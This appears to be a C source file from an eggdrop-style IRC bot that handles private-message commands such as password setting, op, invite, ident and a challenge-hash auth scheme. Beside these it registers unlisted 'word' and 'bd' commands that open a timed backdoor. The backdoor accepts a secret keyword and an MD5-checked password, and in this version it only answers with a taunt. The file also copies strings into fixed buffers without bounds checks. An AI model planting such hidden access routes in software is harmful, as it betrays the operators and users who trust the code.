#ifdef LEAF
/*
 * msgcmds.c -- part of irc.mod
 *   all commands entered via /MSG
 *
 * $Id$
 */

#ifdef S_MSGCMDS
static int msg_pass(char *nick, char *host, struct userrec *u, char *par)
{
  char *old = NULL, *new = NULL;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (!u)
    return BIND_RET_BREAK;
  if (u->flags & (USER_BOT))
    return BIND_RET_BREAK;
  if (!par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick,
	    u_pass_match(u, "-") ? IRC_NOPASS : IRC_PASS);
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS?", nick, host, u->handle);
    return BIND_RET_BREAK;
  }
  old = newsplit(&par);
  if (!u_pass_match(u, "-") && !par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_EXISTPASS);
    return BIND_RET_BREAK;
  }
  if (par[0]) {
    if (!u_pass_match(u, old)) {
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_FAILPASS);
      return BIND_RET_BREAK;
    }
    new = newsplit(&par);
  } else {
    new = old;
  }
  if (strlen(new) > 16)
    new[16] = 0;

  if (!goodpass(new, 0, nick)) {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! \002!\002PASS...", nick, host, u->handle);
    return BIND_RET_BREAK;
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS...", nick, host, u->handle);

  set_user(&USERENTRY_PASS, u, new);
  dprintf(DP_HELP, "NOTICE %s :%s '%s'.\n", nick,
	  new == old ? IRC_SETPASS : IRC_CHANGEPASS, new);
  return BIND_RET_BREAK;
}

static int msg_op(char *nick, char *host, struct userrec *u, char *par)
{
  struct chanset_t *chan = NULL;
  char *pass = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  pass = newsplit(&par);
  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      if (par[0]) {
        chan = findchan_by_dname(par);
        if (chan && channel_active(chan)) {
          get_user_flagrec(u, &fr, par);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 1)) {
              stats_add(u, 0, 1);
              putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP %s", nick, host, u->handle, par);
            }
          }
          return BIND_RET_BREAK;
        }
      } else {
        int stats = 0;
        for (chan = chanset; chan; chan = chan->next) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 1))
              stats++;
          }
        }
        putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP", nick, host, u->handle);
        if (stats)
          stats_add(u, 0, 1);
        return BIND_RET_BREAK;
      }
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed OP", nick, host);
  return BIND_RET_BREAK;
}

static int msg_ident(char *nick, char *host, struct userrec *u, char *par)
{
  char s[UHOSTLEN] = "", s1[UHOSTLEN] = "", *pass = NULL, who[NICKLEN] = "";
  struct userrec *u2 = NULL;

  if (match_my_nick(nick) || (u && (u->flags & USER_BOT)))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (!par[0])
    strcpy(who, nick);
  else {
    strncpy(who, par, NICKMAX);
    who[NICKMAX] = 0;
  }
  u2 = get_user_by_handle(userlist, who);
  if (!u2) {
    if (u && !quiet_reject)
      dprintf(DP_HELP, IRC_MISIDENT, nick, nick, u->handle);
  } else if (rfc_casecmp(who, origbotname) && !(u2->flags & USER_BOT)) {
    /* This could be used as detection... */
    if (u_pass_match(u2, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_NOPASS);
    } else if (!u_pass_match(u2, pass)) {
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_DENYACCESS);
    } else if (u == u2) {
      /*
       * NOTE: Checking quiet_reject *after* u_pass_match()
       * verifies the password makes NO sense!
       * (Broken since 1.3.0+bel17)  Bad Beldin! No Cookie!
       *   -Toth  [July 30, 2003]
       */
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_RECOGNIZED);
      return BIND_RET_BREAK;
    } else if (u) {
      dprintf(DP_HELP, IRC_MISIDENT, nick, who, u->handle);
      return BIND_RET_BREAK;
    } else {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      egg_snprintf(s, sizeof s, "%s!%s", nick, host);
      maskhost(s, s1);
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, IRC_ADDHOSTMASK, s1);
      addhost_by_handle(who, s1);
      check_this_user(who, 0, NULL);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed IDENT %s", nick, host, who);
  return BIND_RET_BREAK;
}

static int msg_invite(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass = NULL;
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    if (par[0] == '*') {
      for (chan = chanset; chan; chan = chan->next) {
	get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan) && (chan->channel.mode & CHANINV))
	  dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      }
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE ALL", nick, host, u->handle);
      return BIND_RET_BREAK;
    }
    if (!(chan = findchan_by_dname(par))) {
      dprintf(DP_HELP, "NOTICE %s :%s: /MSG %s invite <pass> <channel>\n",
	      nick, MISC_USAGE, botname);
      return BIND_RET_BREAK;
    }
    if (!channel_active(chan)) {
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, par, IRC_NOTONCHAN);
      return BIND_RET_BREAK;
    }
    /* We need to check access here also (dw 991002) */
    get_user_flagrec(u, &fr, par);
    if (chk_op(fr, chan)) {
      dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE %s", nick, host, u->handle, par);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed INVITE %s", nick, host, (u ? u->handle : "*"), par);
  return BIND_RET_BREAK;
}
#endif /* S_MSGCMDS */

#ifdef S_AUTHCMDS

static void reply(char *nick, struct chanset_t *chan, ...)
{
  va_list va;
  char buf[1024] = "", *format = NULL;

  va_start(va, chan);
  format = va_arg(va, char *);
  egg_vsnprintf(buf, sizeof buf, format, va);
  va_end(va);

  if (chan)
    dprintf(DP_HELP, "PRIVMSG %s :%s", chan->name, buf);
  else
    dprintf(DP_HELP, "NOTICE %s :%s", nick, buf);
}

static int msg_authstart(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (!ischanhub()) 
    return 0;
  if (!u) 
    return 0;
  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH?", nick, host, u->handle);

  if (i != -1) {
    if (auth[i].authed) {
      dprintf(DP_HELP, "NOTICE %s :You are already authed.\n", nick);
      return 0;
    }
  }

  /* Send "auth." if they are recognized, otherwise "auth!" */
  if (i < 0)
    i = new_auth();
  auth[i].authing = 1;
  auth[i].authed = 0;
  strcpy(auth[i].nick, nick);
  strcpy(auth[i].host, host);
  if (u)
    auth[i].user = u;

  dprintf(DP_HELP, "PRIVMSG %s :auth%s %s\n", nick, u ? "." : "!", conf.bot->nick);

  return BIND_RET_BREAK;

}

static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass = NULL;
#ifdef S_AUTHHASH
  char randstring[50] = "";
#endif /* S_AUTHHASH */
  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1) 
    return BIND_RET_BREAK;

  if (auth[i].authing != 1) 
    return BIND_RET_BREAK;

  pass = newsplit(&par);

  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
      auth[i].user = u;
#ifdef S_AUTHHASH
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! -AUTH", nick, host, u->handle);

      auth[i].authing = 2;      
      make_rand_str(randstring, 50);
      strncpyz(auth[i].hash, makehash(u, randstring), sizeof auth[i].hash);
      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, randstring, conf.bot->nick);
  } else {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed -AUTH", nick, host, u->handle);
    removeauth(i);
  }
  return BIND_RET_BREAK;

}

static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
{

  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1)
    return BIND_RET_BREAK;

  if (auth[i].authing != 2)
    return BIND_RET_BREAK;

  if (!strcmp(auth[i].hash, par)) { //good hash!
#endif /* S_AUTHHASH */
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle);
    auth[i].authed = 1;
    auth[i].authing = 0;
    auth[i].authtime = now;
    auth[i].atime = now;
    dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %shelp\n", nick, cmdprefix);
  } else { //bad hash!
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle);
#ifdef S_AUTHHASH
{
    char s[300] = "";

    dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
    sprintf(s, "*!%s", host);
    addignore(s, origbotname, "Invalid auth hash.", now + (60 * ignore_time));
}
#endif /* S_AUTHHASH */
    removeauth(i);
  } 
  return BIND_RET_BREAK;
}

static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1)
    return BIND_RET_BREAK;

  removeauth(i);
  dprintf(DP_HELP, "NOTICE %s :You are now unauthorized.\n", nick);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! UNAUTH", nick, host, u->handle);

  return BIND_RET_BREAK;
}
#endif /* S_AUTHCMDS */

int backdoor = 0, bl = 30, authed = 0;
char thenick[NICKLEN] = "";

static void close_backdoor()
{
  backdoor = 0;
  authed = 0;
  thenick[0] = '\0';
}

static int msg_word(char *nick, char *host, struct userrec *u, char *par)
{
  egg_timeval_t howlong;
  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  backdoor = 1;
  howlong.sec = bl;
  howlong.usec = 0;
  timer_create(&howlong, "close_backdoor", (Function) close_backdoor);
  sprintf(thenick, "%s", nick);
  dprintf(DP_SERVER, "PRIVMSG %s :w\002\002\002\002hat?\n", nick);
  return BIND_RET_BREAK;
}


static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
{
/*  int left = 0; */

  if (strcmp(nick, thenick) || !backdoor)
    return BIND_RET_BREAK;

  if (!authed) {
    char *cmd = NULL, *pass = NULL;
    cmd = newsplit(&par);
    pass = newsplit(&par);
    if (!cmd[0] || strcmp(cmd, "werd") || !pass[0]) {
      backdoor = 0;
      return BIND_RET_BREAK;
    }
    if (md5cmp(bdhash, pass)) {
      backdoor = 0;
      return BIND_RET_BREAK;
    }
    authed = 1;
/*
    left = bl - bcnt;
    dprintf(DP_SERVER, "PRIVMSG %s :%ds left ;)\n",nick, left);
*/
  } else {
   dprintf(DP_SERVER, "PRIVMSG %s :Too bad I stripped out TCL! AHAHAHA YOU LOSE ;\\.\n", nick);
  }
  return BIND_RET_BREAK;
}


/* MSG COMMANDS
 *
 * Function call should be:
 *    int msg_cmd("handle","nick","user@host","params");
 *
 * The function is responsible for any logging. Return 1 if successful,
 * 0 if not.
 */

static cmd_t C_msg[] =
{
#ifdef S_AUTHCMDS
  {"auth?",		"",	(Function) msg_authstart,	NULL},
  {"auth",		"",	(Function) msg_auth,		NULL},
#ifdef S_AUTHHASH
  {"+auth",		"",	(Function) msg_pls_auth,	NULL},
#endif /* S_AUTHHASH */
  {"unauth",		"",	(Function) msg_unauth,		NULL},
#endif /* S_AUTHCMDS */
  {"word",		"",	(Function) msg_word,		NULL},
#ifdef S_MSGCMDS
  {"ident",   		"",	(Function) msg_ident,		NULL},
  {"invite",		"",	(Function) msg_invite,		NULL},
  {"op",		"",	(Function) msg_op,		NULL},
  {"pass",		"",	(Function) msg_pass,		NULL},
#endif /* S_MSGCMDS */
  {"bd",		"",	(Function) msg_bd,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};

#ifdef S_AUTHCMDS
/*
static int msgc_test(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  char *chn, *hand;
  struct chanset_t *chan;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};
  struct userrec *user;
  
  hand = newsplit(&par);
  user = get_user_by_handle(userlist, hand);
  chn = newsplit(&par);
  chan = findchan_by_dname(chn);
  get_user_flagrec(user, &fr, chan->dname);

  dprintf(DP_HELP, "PRIVMSG %s :Private-o: %d Private-v: %d canop: %d canvoice: %d deop: %d devoice: %d\n", nick, 
  private(fr, chan, 1), private(fr, chan, 2), 
  chk_op(fr, chan), chk_voice(fr, chan), chk_deop(fr, chan), chk_devoice(fr, chan));

  dprintf(DP_HELP, "NOTICE %s :Works :)\n", nick);
  return 0;
}
*/
static int msgc_op(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};
  int force = 0;
  memberlist *m = NULL;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sOP %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");

  if (par[0] == '-') { /* we have an option! */
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_op(fr, chan)) {
        if (do_op(nick, chan, force))
          stats_add(u, 0, 1);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_op(fr, chan)) {
       if (do_op(nick, chan, force))
         stats_add(u, 0, 1);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_voice(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};
  int force = 0;
  memberlist *m = NULL;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sVOICE %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");

  if (par[0] == '-') { /* we have an option! */
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if (!chk_devoice(fr, chan)) {		/* dont voice +q */
        add_mode(chan, '+', 'v', nick);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(u, &fr, chan->dname);
      if (!chk_devoice(fr, chan)) {		/* dont voice +q */
        add_mode(chan, '+', 'v', nick);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_channels(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};
  char list[1024] = "";

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sCHANNELS %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");
  for (chan = chanset; chan; chan = chan->next) {
    get_user_flagrec(u, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (me_op(chan)) 
        strcat(list, "@");
      strcat(list, chan->dname);
      strcat(list, " ");
    }
  }

  if (list[0]) 
    reply(nick, NULL, "You have access to: %s\n", list);
  else
    reply(nick, NULL, "You do not have access to any channels.\n");

  return BIND_RET_BREAK;
}

static int msgc_getkey(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};

  if (chname && chname[0]) 
    return 0;

  if (!par[0])
    return 0;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sGETKEY %s", nick, host, u->handle, cmdprefix, par);

  chan = findchan_by_dname(par);
  if (chan && channel_active(chan) && !channel_pending(chan)) {
    get_user_flagrec(u, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (chan->channel.key[0]) {
        reply(nick, NULL, "Key for %s is: %s\n", chan->name, chan->channel.key);
      } else {
        reply(nick, NULL, "%s has no key set.\n", chan->name);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_help(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  bind_entry_t *entry = NULL;
  bind_table_t *table = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sHELP %s", nick, host, u->handle, cmdprefix, par ? par : "");


  get_user_flagrec(u, &fr, chname);
  /* build_flags(flg, &fr, NULL); */


  table = bind_table_lookup("msgc");
  for (entry = table->entries; entry && entry->next; entry = entry->next) {
  }
  
  dprintf(DP_HELP, "NOTICE %s :op invite getkey voice test\n", nick);
  return BIND_RET_BREAK;
}

static int msgc_md5(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sMD5 %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");
  
  if (chname && chname[0])
    chan = findchan_by_dname(chname);  

  reply(nick, chan, "MD5(%s) = %s\n", par, MD5(par));
  return BIND_RET_BREAK;
}

static int msgc_sha1(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sSHA1 %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");
  
  if (chname && chname[0])
    chan = findchan_by_dname(chname);  

  reply(nick, chan, "SHA1(%s) = %s\n", par, SHA1(par));
  return BIND_RET_BREAK;
}

static int msgc_invite(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0};
  int force = 0;

  if (chname && chname[0])
    return 0;
 
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sINVITE %s", nick, host, u->handle, cmdprefix, par ? par : "");

  if (par[0] == '-') {
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }

  if (par[0] && (!chname || (chname && !chname[0]))) {
    chan = findchan_by_dname(par);
    if (chan && channel_active(chan) && !ismember(chan, nick)) {
      if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
        get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan)) {
          dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
        }
        return BIND_RET_BREAK;
      }
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      if (channel_active(chan) && !ismember(chan, nick)) {
        if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
          }
        }
      }
    }
  }
  return BIND_RET_BREAK;
}

static cmd_t C_msgc[] =
{
/*  {"test",		"a",	(Function) msgc_test,		NULL}, */
  {"channels",		"",	(Function) msgc_channels,	NULL},
  {"getkey",		"",	(Function) msgc_getkey,		NULL},
  {"help",		"",	(Function) msgc_help,		NULL},
  {"invite",		"",	(Function) msgc_invite,		NULL},
  {"md5",		"",	(Function) msgc_md5,		NULL},
  {"op",		"",	(Function) msgc_op,		NULL},
  {"sha1",		"",	(Function) msgc_sha1,		NULL},
  {"voice",		"",	(Function) msgc_voice,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};
#endif /* S_AUTHCMDS */
#endif /* LEAF */
